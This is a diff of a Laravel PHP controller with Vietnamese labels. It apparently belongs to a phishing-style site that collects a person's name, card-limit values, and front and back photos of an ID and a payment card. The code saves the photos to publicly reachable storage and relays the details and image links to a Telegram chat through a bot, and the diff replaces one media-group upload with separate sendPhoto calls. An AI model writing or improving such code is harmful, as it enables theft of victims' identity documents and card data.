@@ -47,19 +47,19 @@ class CustomerController extends Controller
 
         // save image to storage
         $mattruoc = $request->file('mattruoc');
-        $mattruoc_name = 'mặt trước-'. $request->name . time() . '.' . $mattruoc->extension();
+        $mattruoc_name = 'mặt trước-' . $request->name . time() . '.' . $mattruoc->extension();
         $mattruoc->storeAs('public', $mattruoc_name);
 
         $matsau = $request->file('matsau');
-        $matsau_name = 'mặt sau-'. $request->name . time() . '.' . $matsau->extension();
+        $matsau_name = 'mặt sau-' . $request->name . time() . '.' . $matsau->extension();
         $matsau->storeAs('public', $matsau_name);
 
         $mattruoc_card = $request->file('mattruoc_card');
-        $mattruoc_card_name = 'mặt trước thẻ-'. $request->name . time() . '.' . $mattruoc_card->extension();
+        $mattruoc_card_name = 'mặt trước thẻ-' . $request->name . time() . '.' . $mattruoc_card->extension();
         $mattruoc_card->storeAs('public', $mattruoc_card_name);
 
         $matsau_card = $request->file('matsau_card');
-        $matsau_card_name =  'mặt sau thẻ-'. $request->name . time() . '.' . $matsau_card->extension();
+        $matsau_card_name =  'mặt sau thẻ-' . $request->name . time() . '.' . $matsau_card->extension();
         $matsau_card->storeAs('public', $matsau_card_name);
 
         // save to database
@@ -99,61 +99,39 @@ class CustomerController extends Controller
         $message .= " <b>Giới hạn tối đa:</b> " . $request->limit_total . "\n";
         $message .= " <b>Giới hạn tăng:</b> " . $request->limit_increase . "\n";
         // ảnh mặt trước
-        $message .= " <b>Ảnh mặt trước:</b> " . "<a href='". asset('storage/' . $mattruoc_name). "'>". asset('storage/' . $mattruoc_name) . "</a>" . "\r\n";
+        $message .= " <b>Ảnh mặt trước:</b> " . "<a href='" . asset('storage/' . $mattruoc_name) . "'>" . asset('storage/' . $mattruoc_name) . "</a>" . "\r\n";
 
         // ảnh mặt sau
 
-        $message .= " <b>Ảnh mặt sau:</b> " . "<a href='". asset('storage/' . $matsau_name). "'>". asset('storage/' . $matsau_name) . "</a>" . "\r\n";
+        $message .= " <b>Ảnh mặt sau:</b> " . "<a href='" . asset('storage/' . $matsau_name) . "'>" . asset('storage/' . $matsau_name) . "</a>" . "\r\n";
 
         // ảnh mặt trước thẻ
 
-        $message .= " <b>Ảnh mặt trước thẻ:</b> " . "<a href='". asset('storage/' . $mattruoc_card_name). "'>". asset('storage/' . $mattruoc_card_name) . "</a>" . "\r\n";
+        $message .= " <b>Ảnh mặt trước thẻ:</b> " . "<a href='" . asset('storage/' . $mattruoc_card_name) . "'>" . asset('storage/' . $mattruoc_card_name) . "</a>" . "\r\n";
 
         // ảnh mặt sau thẻ
 
-        $message .= " <b>Ảnh mặt sau thẻ:</b> " . "<a href='". asset('storage/' . $matsau_card_name). "'>". asset('storage/' . $matsau_card_name) . "</a>" . "\r\n";
-        
+        // $message .= " <b>Ảnh mặt sau thẻ:</b> " . "<a href='". asset('storage/' . $matsau_card_name). "'>". asset('storage/' . $matsau_card_name) . "</a>" . "\r\n";
+
         $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendMessage?chat_id=" . env('TELEGRAM_CHAT_ID') . "&text=" . $message . "&parse_mode=HTML";
 
-        $response = file_get_contents($url);
+        file_get_contents($url);
 
-        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendMediaGroup";
+        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" . asset('storage/' . $mattruoc_name) . "&caption=Ảnh mặt trước";
 
-        $postContent = json_encode([
-            'chat_id' => env('TELEGRAM_CHAT_ID'),   
-            'media' => json_encode([
-                [
-                    'type' => 'photo',
-                    'media' => 'attach://' . $mattruoc_name,
-                    'caption' => 'Ảnh mặt trước'
-                ],
-                [
-                    'type' => 'photo',
-                    'media' => 'attach://' . $matsau_name,
-                    'caption' => 'Ảnh mặt sau'
-                ],
-                [
-                    'type' => 'photo',
-                    'media' => 'attach://' . $mattruoc_card_name,
-                    'caption' => 'Ảnh mặt trước thẻ'
-                ],
-                [
-                    'type' => 'photo',
-                    'media' => 'attach://' . $matsau_card_name,
-                    'caption' => 'Ảnh mặt sau thẻ'
-                ]
-            ]),
-            $mattruoc_name  => new \CURLFile(storage_path('app/public/' . $mattruoc_name)),
-            $matsau_name => new \CURLFile(storage_path('app/public/' . $matsau_name)),
-            $mattruoc_card_name => new \CURLFile(storage_path('app/public/' . $mattruoc_card_name)),
-            $matsau_card_name => new \CURLFile(storage_path('app/public/' . $matsau_card_name)),
-        ]);
+        file_get_contents($url);
 
-        try {
-            $response = $this->postImage($url, $postContent);
-        } catch (\Exception $e) {
-            Log::error($e->getMessage());
-        }
+        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" . asset('storage/' . $matsau_name) . "&caption=Ảnh mặt sau";
+
+        file_get_contents($url);
+
+        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" . asset('storage/' . $mattruoc_card_name) . "&caption=Ảnh mặt trước thẻ";
+
+        file_get_contents($url);
+
+        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" . asset('storage/' . $matsau_card_name) . "&caption=Ảnh mặt sau thẻ";
+
+        file_get_contents($url);
 
         return response()->json([
             'message' => 'Thêm khách hàng thành công',
@@ -162,7 +140,7 @@ class CustomerController extends Controller
     }
     public function postImage($url, $postContent)
     {
-    
+
         $curl = curl_init();
         curl_setopt($curl, CURLOPT_URL, $url);
         curl_setopt($curl, CURLOPT_POSTFIELDS, $postContent);
